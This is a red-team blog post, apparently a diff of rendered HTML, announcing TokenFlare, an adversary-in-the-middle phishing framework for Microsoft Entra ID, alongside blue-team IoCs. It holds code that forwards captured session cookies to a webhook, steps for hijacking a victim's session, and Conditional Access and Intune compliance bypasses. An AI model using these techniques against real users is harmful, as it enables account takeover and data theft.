@@ -1,0 +1,505 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  
+    <title>TokenFlare: Serverless AiTM Phishing in Under 60 Seconds :: Gladstomych</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="
+At Beac0n 2025, I counted the talks. Five were about payloads, C2 frameworks, and endpoint evasion. One covered physical security. One was AI. And one (mine) was about cloud-native identity attacks.
+That ratio felt off. Over the past 18 months, our team has run entire red team engagements without ever touching a user&rsquo;s endpoint. No C2, no beacon. Just creds, session cookies, and the Graph API. Threat actors have figured this out too-Midnight Blizzard didn&rsquo;t need a binary payload to compromise Microsoft themselves.
+" />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="//localhost:1313/blog/tokenflare-serverless-aitm-phishing/" />
+
+
+
+
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">
+
+
+
+
+
+
+
+<link rel="shortcut icon" href="//localhost:1313/favicon.png">
+<link rel="apple-touch-icon" href="//localhost:1313/apple-touch-icon.png">
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="TokenFlare: Serverless AiTM Phishing in Under 60 Seconds">
+<meta property="og:description" content="
+At Beac0n 2025, I counted the talks. Five were about payloads, C2 frameworks, and endpoint evasion. One covered physical security. One was AI. And one (mine) was about cloud-native identity attacks.
+That ratio felt off. Over the past 18 months, our team has run entire red team engagements without ever touching a user&rsquo;s endpoint. No C2, no beacon. Just creds, session cookies, and the Graph API. Threat actors have figured this out too-Midnight Blizzard didn&rsquo;t need a binary payload to compromise Microsoft themselves.
+" />
+<meta property="og:url" content="//localhost:1313/blog/tokenflare-serverless-aitm-phishing/" />
+<meta property="og:site_name" content="Gladstomych" />
+
+  <meta property="og:image" content="//localhost:1313/og-image.png">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2025-12-18 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body>
+
+
+<div class="container center">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    ~/gladstomych
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/blog">Blog</a></li>
+        
+      
+        
+          <li><a href="/talks">Talks</a></li>
+        
+      
+        
+          <li><a href="/tools">Tools</a></li>
+        
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/blog" >Blog</a></li>
+        
+      
+        
+          <li><a href="/talks" >Talks</a></li>
+        
+      
+        
+          <li><a href="/tools" >Tools</a></li>
+        
+      
+        
+          <li><a href="/about" >About</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="//localhost:1313/blog/tokenflare-serverless-aitm-phishing/">TokenFlare: Serverless AiTM Phishing in Under 60 Seconds</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2025-12-18</time></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="//localhost:1313/tags/azure/">azure</a>&nbsp;
+      
+      #<a href="//localhost:1313/tags/cloud-red-team/">cloud-red-team</a>&nbsp;
+      
+      #<a href="//localhost:1313/tags/initial-access/">initial-access</a>&nbsp;
+      
+      #<a href="//localhost:1313/tags/phishing/">phishing</a>&nbsp;
+      
+      #<a href="//localhost:1313/tags/tooling/">tooling</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <p><img src="/blog/tokenflare-serverless-aitm-phishing/banner.png" alt="TokenFlare banner"></p>
+<p>At <a href="https://beac0n.org/">Beac0n 2025</a>, I counted the talks. Five were about payloads, C2 frameworks, and endpoint evasion. One covered physical security. One was AI. And one (mine) was about cloud-native identity attacks.</p>
+<p>That ratio felt off. Over the past 18 months, our team has run entire red team engagements without ever touching a user&rsquo;s endpoint. No C2, no beacon. Just creds, session cookies, and the Graph API. Threat actors have figured this out too-Midnight Blizzard didn&rsquo;t need a binary payload to compromise Microsoft themselves.</p>
+<p>Today, we&rsquo;re releasing <strong>TokenFlare</strong>, a serverless Adversary-in-the-Middle (AiTM) phishing framework for Entra ID / M365, to help close that gap. It&rsquo;s the tool our team at JUMPSEC has used internally for over a year across 15+ adversarial engagements. We&rsquo;re open-sourcing it because we believe the barrier to entry for legitimate security testing shouldn&rsquo;t be higher than it is for the criminals selling plug-and-play phishing kits on dark web forums.</p>
+<p>We actually released it on main stage at BSides London last Saturday to what I&rsquo;d describe as roaring approval. (Full disclosure: most of the roaring came from our own team in the audience.)</p>
+<p><strong>GitHub</strong>: <a href="https://github.com/JumpsecLabs/TokenFlare">https://github.com/JumpsecLabs/TokenFlare</a></p>
+<h2 id="tldr--get-started-in-under-a-minute">TL;DR – Get Started in Under a Minute<a href="#tldr--get-started-in-under-a-minute" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>For those who want to dive straight in:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># 0. Clone the repo.</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Dependencies - python3.7+, Node.js 20+, and globally installed Wrangler CLI</span>
+</span></span><span style="display:flex;"><span>git clone https://github.com/JumpsecLabs/TokenFlare.git
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 1. Initialise for your domain - this domain is for deploying on your VPS</span>
+</span></span><span style="display:flex;"><span>python3 tokenflare.py init yourdomain.com
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 2. Configure your campaign (interactive wizard)</span>
+</span></span><span style="display:flex;"><span>python3 tokenflare.py configure campaign
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 3. Set up CloudFlare credentials - i.e. for deploying on Cloudflare</span>
+</span></span><span style="display:flex;"><span>python3 tokenflare.py configure cf
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 4. Deploy to CloudFlare Workers</span>
+</span></span><span style="display:flex;"><span>python3 tokenflare.py deploy remote
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 5. Check your lure URL</span>
+</span></span><span style="display:flex;"><span>python3 tokenflare.py status --get-lure-url
+</span></span></code></pre></div><p>That&rsquo;s it. Working AiTM infrastructure, with SSL, bot protection, and credential capture to your webhook of choice. The rest of this post explains why we built it, how it works, and what blue teams should look for.</p>
+<p><img src="/blog/tokenflare-serverless-aitm-phishing/init.png" alt="Screenshot of tokenflare init output"></p>
+<h2 id="why-release-this-now">Why Release This Now?<a href="#why-release-this-now" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>If you work in threat intelligence, you&rsquo;ll know AiTM phishing kits are commoditised on underground forums - accessible to anyone with cryptocurrency and a Telegram account. Workers.dev is already a popular choice for threat actor infrastructure. We&rsquo;re not introducing anything novel; we&rsquo;re giving authorised testers the same capabilities.</p>
+<p>Meanwhile, legitimate security practitioners often wrestle with complex, temperamental frameworks just to get infrastructure running. To me as a red teamer, fighting with my tooling is probably not what creeates the most value for my client. I&rsquo;d rather spend my time in crafting compelling pretexts and demonstrating gaps in people, process, and technology if I could.</p>
+<p>I&rsquo;d like to level the playing field for the open security community.</p>
+<h2 id="the-tokenflare-origin-story">The TokenFlare Origin Story<a href="#the-tokenflare-origin-story" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>Before the serverless stack, setting up AiTM phishing infrastructure was genuinely painful. It used to take us one to two consultant-days of setup time for a single campaign. Phishlets (that other people wrote) were hit-and-miss. Credential capture worked reliably enough, but getting the post-authentication redirect to behave? That was where hours disappeared.</p>
+<p>I once gave a 40-minute internal technical talk just to document all the learnings and gotchas for setting up our previous framework properly. I&rsquo;ll be honest - I never wanted to watch that recording myself. The tool was fighting us at every turn when all we wanted was to create an interesting, client-branded campaign.</p>
+<p>Now that I&rsquo;ve thought about the problem deeply, I think it lies in the fact that traditional AiTM frameworks needed to be everything: web server, campaign configurator, credential store, and campaign manager all in one monolithic binary. It&rsquo;s a lot of complexity for what is fundamentally a reverse proxy with some cookie interception.</p>
+<h3 id="lets-go-serverless">Let&rsquo;s Go Serverless<a href="#lets-go-serverless" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p>The breakthrough came when we asked: what if we went serverless?</p>
+<p>Cloud providers like CloudFlare already handle SSL termination, load balancing, CDN, bot protection, anti-DDoS, and global routing. If we let them do the infrastructure heavy lifting, our code could focus purely on the AiTM logic itself.</p>
+<p><a href="https://github.com/zolderio/">Zolderio</a> proved this was viable with a prototype proof-of-concept: a working AiTM reverse proxy for Entra ID in just <strong>174 lines of JavaScript</strong>. That prototype evolved into our v0.1 internal worker, which we used in production operations for months. The core logic was around 250-300 lines.</p>
+<p><a href="https://github.com/Cyb3rC3lt/">Dave @Cyb3rC3lt</a> built out our v1 production worker, adding the operational features we needed. For a while, our workflow was: edit the worker JavaScript, paste it into the CloudFlare dashboard, click deploy. It worked, but it wasn&rsquo;t infrastructure-as-code, and the browser-based developer experience was horrid if I&rsquo;m being generous.</p>
+<h3 id="from-dashboard-to-cli">From Dashboard to CLI<a href="#from-dashboard-to-cli" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p>The evolution continued. We discovered Wrangler - CloudFlare&rsquo;s CLI tool - which meant we could run Workers locally for testing and deploy remotely with a single command. Configuration moved to a <code>wrangler.toml</code> file. Suddenly we had version control, repeatable deployments, and a much better developer experience.</p>
+<p>But there was still friction. New team members needed to understand Wrangler commands, know which variables to tweak, and remember the deployment workflow. I wrote documentation, but documentation isn&rsquo;t the same as a tool that guides you through the process.</p>
+<p>TokenFlare is that tool: a Python CLI wrapper that handles dependency checks, interactive campaign configuration, SSL certificate management, and deployment - while still letting experienced operators drop into the raw worker code and toml file when they need to.</p>
+<p><strong>The result?</strong> In 2025, our new adversarial simulation consultants can spin up working phishing infrastructure in under an hour with the manual stack. With TokenFlare&rsquo;s interactive wizard, I expect that to shrink to minutes - or even sub-minute for operators who know what they want.</p>
+<h3 id="how-does-tokenflare-compare">How Does TokenFlare Compare?<a href="#how-does-tokenflare-compare" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p>There are established AiTM frameworks out there - Evilginx, Modlishka, and others. Here&rsquo;s where TokenFlare differs:</p>
+<table>
+  <thead>
+      <tr>
+          <th></th>
+          <th><strong>TokenFlare</strong></th>
+          <th><strong>Traditional Frameworks</strong></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><strong>Architecture</strong></td>
+          <td>Serverless (CloudFlare Workers)</td>
+          <td>Self-hosted web server</td>
+      </tr>
+      <tr>
+          <td><strong>Setup time</strong></td>
+          <td>Minutes</td>
+          <td>At least hours</td>
+      </tr>
+      <tr>
+          <td><strong>Core logic</strong></td>
+          <td>~530 lines JS</td>
+          <td>Larger codebases</td>
+      </tr>
+      <tr>
+          <td><strong>Infrastructure</strong></td>
+          <td>Cloud provider handles TLS, CDN, DDoS</td>
+          <td>You manage everything</td>
+      </tr>
+      <tr>
+          <td><strong>Credential store</strong></td>
+          <td>Webhook-based (Slack, Discord, Teams)</td>
+          <td>Local database/files</td>
+      </tr>
+      <tr>
+          <td><strong>Learning curve</strong></td>
+          <td>Interactive wizard</td>
+          <td>Config files + documentation</td>
+      </tr>
+      <tr>
+          <td><strong>Target scope</strong></td>
+          <td>Entra ID / M365 focused</td>
+          <td>Multi-provider support</td>
+      </tr>
+  </tbody>
+</table>
+<p>TokenFlare is purpose-built for Entra ID phishing simulations where speed and simplicity matter. If you need to target non-Microsoft identity providers or want a full campaign management UI, the established tools may serve you better.</p>
+<h2 id="how-tokenflare-works">How TokenFlare Works<a href="#how-tokenflare-works" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<h3 id="the-serverless-aitm-concept">The Serverless AiTM Concept<a href="#the-serverless-aitm-concept" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p><img src="/blog/tokenflare-serverless-aitm-phishing/aitm.png" alt="Diagram showing AiTM flow"></p>
+<p>The core concept is straightforward:</p>
+<ol>
+<li>User clicks your lure URL and hits the TokenFlare Worker, which runs the 530 lines of JavaScript in worker.js</li>
+<li>Worker initiates an OAuth2 authorization flow against <code>login.microsoftonline.com</code></li>
+<li>User sees Microsoft&rsquo;s legitimate login page (with your client branding if configured)</li>
+<li>User enters credentials and completes MFA</li>
+<li>Microsoft returns session cookies (<code>ESTSAUTH</code>, <code>ESTSAUTHPERSISTENT</code>) to the Worker</li>
+<li>Worker captures and forwards credentials/cookies to your webhook</li>
+<li>User is redirected to a legitimate destination (e.g., the real SharePoint site they expected)</li>
+</ol>
+<p>All the TLS, routing, and edge infrastructure is handled by CloudFlare. Your Worker is just ~530 lines of JavaScript focused on the proxy logic and credential interception.</p>
+<p>The core capture logic is straightforward. When Microsoft returns session cookies after successful authentication, we grab them:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#75715e">// Cookie capture - notify on auth cookies
+</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">cookiesSet</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">getSetCookies</span>(<span style="color:#a6e22e">outHeaders</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">cookie</span> <span style="color:#66d9ef">of</span> <span style="color:#a6e22e">cookiesSet</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">cookie</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#39;ESTSAUTH=&#39;</span>)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">secondCookie</span> <span style="color:#66d9ef">of</span> <span style="color:#a6e22e">cookiesSet</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">secondCookie</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#39;ESTSAUTHPERSISTENT=&#39;</span>)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">notifyCookies</span>(<span style="color:#a6e22e">cfg</span>.<span style="color:#a6e22e">webhookUrl</span>, <span style="color:#a6e22e">cookie</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\n\n&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">secondCookie</span>, <span style="color:#a6e22e">log</span>);
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>That&rsquo;s it. When both <code>ESTSAUTH</code> and <code>ESTSAUTHPERSISTENT</code> cookies appear in the response, they&rsquo;re forwarded to your webhook. Credentials from POST bodies and authorization codes from redirect URLs are captured similarly.</p>
+<p>On a recent engagement against a global retail brand, we deployed TokenFlare at 9am. By lunchtime we had valid session cookies for three users, including one from engineering. The CAP required compliant devices - we used the macOS UA spoof. Total infrastructure time: 15 minutes.</p>
+<h3 id="what-to-do-with-captured-cookies">What To Do With Captured Cookies<a href="#what-to-do-with-captured-cookies" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p>Once you have <code>ESTSAUTH</code> and <code>ESTSAUTHPERSISTENT</code> cookies, turning them into an authenticated session is straightforward. Screenshot below showing cookies and creds coming into our Slack channel around 9:05, we will also look at the Entra log for the same auth later.</p>
+<p><img src="/blog/tokenflare-serverless-aitm-phishing/marty1.png" alt="Screenshot of Cookies and creds received"></p>
+<ol>
+<li>Open a fresh browser (or incognito window) with no existing Microsoft sessions</li>
+<li>Navigate to any M365 service - <code>office.com</code> works well</li>
+<li>Click sign in and let it redirect you to <code>login.microsoftonline.com</code></li>
+<li>Open DevTools, clear the existing cookies for that domain</li>
+<li>Import your captured <code>ESTSAUTH</code> and <code>ESTSAUTHPERSISTENT</code> cookies</li>
+<li>Refresh the page - you&rsquo;re now authenticated as the victim</li>
+</ol>
+<p>From that &ldquo;hot&rdquo; browser session, your options open up: dive into SharePoint for sensitive documents, use <a href="https://github.com/JumpsecLabs/TokenSmith">TokenSmith</a> to redeem access and refresh tokens, or run <a href="https://github.com/dafthack/GraphRunner">GraphRunner</a> with device code sign-in for full post-exploitation capabilities.</p>
+<h3 id="local-vs-remote-deployment">Local vs Remote Deployment<a href="#local-vs-remote-deployment" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p>TokenFlare supports two deployment modes:</p>
+<p><strong>Local deployment</strong> runs the Worker on your VPS using Wrangler&rsquo;s local dev server. You&rsquo;ll need to configure SSL certificates (TokenFlare can automate this via Certbot) and point your domain&rsquo;s DNS to your server. This is great for testing and for scenarios where you want full control.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo python3 tokenflare.py configure ssl
+</span></span><span style="display:flex;"><span>sudo python3 tokenflare.py deploy local
+</span></span></code></pre></div><p><img src="/blog/tokenflare-serverless-aitm-phishing/ssl.png" alt="Screenshot of tokenflare configure SSL"></p>
+<p><strong>Remote deployment</strong> pushes the Worker to CloudFlare&rsquo;s global edge network. Your domain uses CloudFlare&rsquo;s nameservers, and everything runs on their infrastructure. This is the production deployment mode for most engagements.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 tokenflare.py configure cf
+</span></span><span style="display:flex;"><span>python3 tokenflare.py deploy remote
+</span></span></code></pre></div><p><img src="/blog/tokenflare-serverless-aitm-phishing/deploy-remote2.png" alt="Screenshot of tokenflare deploy remote - 2"></p>
+<p><img src="/blog/tokenflare-serverless-aitm-phishing/deploy-remote.png" alt="Screenshot of tokenflare deploy remote"></p>
+<p><strong>A Note on CloudFlare Terms of Service</strong></p>
+<p>Using CloudFlare&rsquo;s services to phish third parties - even for authorised testing - may violate their ToS. We&rsquo;re not lawyers, but we want to be upfront: if you deploy to CloudFlare Workers and something goes wrong, your account could be suspended.</p>
+<p>Options to consider:</p>
+<ul>
+<li><strong>Local deployment</strong> is ToS-safe - you&rsquo;re running Wrangler on your own infrastructure</li>
+<li><strong>Dedicated CF accounts</strong> for engagements keep your production account separate</li>
+</ul>
+<p>Consider yourself warned. Don&rsquo;t email us if you get an abuse notice on your prod account!</p>
+<h2 id="built-in-opsec--campaign-customisation">Built-in OpSec &amp; Campaign Customisation<a href="#built-in-opsec--campaign-customisation" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<h3 id="bot-and-scraper-blocking">Bot and Scraper Blocking<a href="#bot-and-scraper-blocking" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p>TokenFlare includes built-in blocking for known bots, scrapers, and security scanners. The defaults block:</p>
+<ul>
+<li><strong>User-Agent substrings</strong>: <code>googlebot</code>, <code>bingbot</code>, <code>bot</code>, and other crawler signatures</li>
+<li><strong>AS organisations</strong>: Google proxy, Digital Ocean, and other hosting/proxy providers</li>
+<li><strong>Mozilla heuristic</strong>: Requests without <code>Mozilla/5.0</code> in the UA are rejected (filters most automated scanners)</li>
+</ul>
+<p>This list exists because we learned the hard way. Early campaigns using Zolderio&rsquo;s prototype got burned within 30 minutes - security vendors crawled the lure URL and the domain was flagged. We collected the IPs, ASNs, and User-Agents that hit us and built the blocklist from real-world data. It&rsquo;s battle-tested across 15+ engagements. If something new starts burning campaigns, we update it.</p>
+<h3 id="the-common-trick-for-client-branding">The &lsquo;Common&rsquo; Trick for Client Branding<a href="#the-common-trick-for-client-branding" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p>Getting the target organisation&rsquo;s branding on the Microsoft login page is trivial with the <code>/common/</code> endpoint:</p>
+<pre tabindex="0"><code>login.microsoftonline.com/client.domain/oauth2/v2.0/authorize...
+</code></pre><p>Replace <code>common</code> with the target&rsquo;s domain, and Microsoft helpfully displays their logo and colour scheme. TokenFlare&rsquo;s <code>configure campaign</code> wizard handles this for you.</p>
+<h3 id="conditional-access-policy-considerations">Conditional Access Policy Considerations<a href="#conditional-access-policy-considerations" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p>Conditional Access Policies are the core of Entra ID&rsquo;s perimeter defence. The AiTM server needs to satisfy the CAP requirements - if it doesn&rsquo;t, no valid session cookies get minted. TokenFlare supports several approaches:</p>
+<p><strong>User-Agent Manipulation</strong></p>
+<p>Many organisations have CAPs that enforce compliant Windows devices but allow unmanaged iOS or macOS for flexibility. TokenFlare lets you control the User-Agent sent to Microsoft:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-toml" data-lang="toml"><span style="display:flex;"><span><span style="color:#75715e"># In wrangler.toml - spoof as iOS Safari</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CUSTOM_USER_AGENT</span> = <span style="color:#e6db74">&#34;Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15&#34;</span>
+</span></span></code></pre></div><p>If the target CAP allows unmanaged iOS devices, you satisfy the policy and get valid tokens - even though the victim authenticated from their Windows machine.</p>
+<p><strong>Intune Compliant Device Bypass</strong></p>
+<p>For environments requiring Intune-compliant devices, TokenFlare supports the <a href="https://labs.jumpsec.com/tokensmith-bypassing-intune-compliant-device-conditional-access/">bypass we documented in TokenSmith</a>. The Intune Company Portal uses a specific client ID (<code>9ba1a5c7-f17a-4de9-a1f1-6178c8d51223</code>) and redirect URI that bypasses compliant device checks - because Microsoft can&rsquo;t require a device to be compliant <em>before</em> it enrols.</p>
+<p>The OAuth flow uses:</p>
+<pre tabindex="0"><code>client_id=9ba1a5c7-f17a-4de9-a1f1-6178c8d51223
+redirect_uri=ms-appx-web://Microsoft.AAD.BrokerPlugin/S-1-15-2-...
+</code></pre><p>Configure this in TokenFlare via <code>configure campaign</code> and you can obtain tokens that would normally require a compliant device. The tokens are part of Microsoft&rsquo;s &ldquo;Family of Client IDs&rdquo; (FOCI), meaning they can request access tokens for other resources like MS Graph.</p>
+<p><img src="/blog/tokenflare-serverless-aitm-phishing/intune.png" alt="Screenshot of tokenflare configure campaign wizard output"></p>
+<p>If we configure the flow to use the Intune bypass, the user would be taken to an Intune OAuth flow instead. On a plain Entra signin page we&rsquo;d expect to see the &ldquo;Intune&rdquo; logo, but here it&rsquo;s very conveniently blocked by client branding. Here we see the marty user demo-ing signing in.</p>
+<p><img src="/blog/tokenflare-serverless-aitm-phishing/intune3.png" alt="Screenshot of tokenflare user sign in to Intune page"></p>
+<h2 id="iocs-for-blue-teams">IoCs for Blue Teams<a href="#iocs-for-blue-teams" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>Full transparency - the indicators exist because we put them there. TokenFlare is designed for authorised testing, and we want blue teams to be able to identify it easily, at least when the operator is not deliberately trying to be stealthy (or is relatively unsophisticated).</p>
+<h3 id="intentional-indicators-easy-mode">Intentional Indicators (Easy Mode)<a href="#intentional-indicators-easy-mode" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p>In your Entra ID sign-in logs, look for:</p>
+<pre tabindex="0"><code>Header:     X-TokenFlare: Authorised-Security-Testing
+User-Agent: TokenFlare/1.0 For_Authorised_Testing_Only
+</code></pre><p>Also watch for:</p>
+<ul>
+<li><strong>workers.dev domains in email links</strong>  -  which is a TI-backed recommendation, going beyond TokenFlare.</li>
+<li><strong>Default URL parameters</strong>  -  the default lure path uses <code>verifyme?uuid=</code> structure</li>
+<li><strong>CloudFlare ASN (AS13335)</strong>  -  authentication requests originating from CloudFlare&rsquo;s IP ranges</li>
+</ul>
+<p>If you&rsquo;re seeing these and don&rsquo;t have an active red team engagement, something is wrong.</p>
+<h3 id="beyond-the-breadcrumbs">Beyond the Breadcrumbs<a href="#beyond-the-breadcrumbs" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p>The intentional IoCs above won&rsquo;t help you catch threat actors who aren&rsquo;t polite enough to announce themselves. For <em>any</em> AiTM attack against Entra ID, consider:</p>
+<ul>
+<li><strong>Sign-in location vs session usage location mismatch</strong>  -  user authenticates from CloudFlare&rsquo;s ASN (or AWS, Azure, etc.) but their session is used from a completely different location minutes later</li>
+<li><strong>Impossible travel with valid sessions</strong>  -  authentication from one geography, immediate API access from another</li>
+<li><strong>OAuth token requests for unusual client IDs</strong>  -  especially FOCI clients being used in ways that don&rsquo;t match normal user behaviour</li>
+<li><strong>High-volume sign-ins from hosting provider ASNs</strong>  -  legitimate users rarely authenticate from DigitalOcean or Cloudflare edge nodes</li>
+</ul>
+<p>Our Detection &amp; Response team is working on a companion blog post with specific KQL queries and detection strategies for AiTM attacks. Watch the <a href="https://labs.jumpsec.com/">JUMPSEC Labs blog</a> for that.</p>
+<p><img src="/blog/tokenflare-serverless-aitm-phishing/signinlog1.png" alt="Screenshot of Entra sign-in log showing TokenFlare User-Agent"></p>
+<p><img src="/blog/tokenflare-serverless-aitm-phishing/asn.png" alt="Screenshot of Entra sign-in log showing Cloudflare ASN"></p>
+<p>Here you can see Marty&rsquo;s earlier sign in ended up in the sign in logs with the IoC user agent. The flow he went through was indeed the Intune one, and the IP address he signed in with was indeed from Cloudflare&rsquo;s ASN.</p>
+<h2 id="advanced-use-cases--future-development">Advanced Use Cases &amp; Future Development<a href="#advanced-use-cases--future-development" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>TokenFlare is under active development. Current and planned features include:</p>
+<ul>
+<li><strong>Better campaign management</strong>: More commands for existing infra, for example <code>infra cf list</code>, <code>infra cf remove &lt;worker&gt;</code>.</li>
+<li><strong>Token redemption</strong>: The <code>/oauth2/v2.0/token</code> endpoint support for exchanging authorization codes for access and refresh tokens (WIP)</li>
+<li><strong>Passkey downgrade attacks</strong>: Techniques for environments with FIDO2/passkey requirements</li>
+<li><strong>Turnstile/reCAPTCHA integration</strong>: For scenarios requiring additional bot protection</li>
+<li><strong>Static HTML responses</strong>: Custom landing pages before or after the Auth is complete, for if you&rsquo;d not want to redirect the user away.</li>
+<li><strong>Entra Terms of Use bypass</strong>: For environments with ToU acceptance requirements</li>
+</ul>
+<p>Not all future features will be public - some will remain internal tooling - but we&rsquo;ll continue developing the core framework openly.</p>
+<h2 id="acknowledgements">Acknowledgements<a href="#acknowledgements" class="hanchor" ariaLabel="Anchor">#</a> </h2>
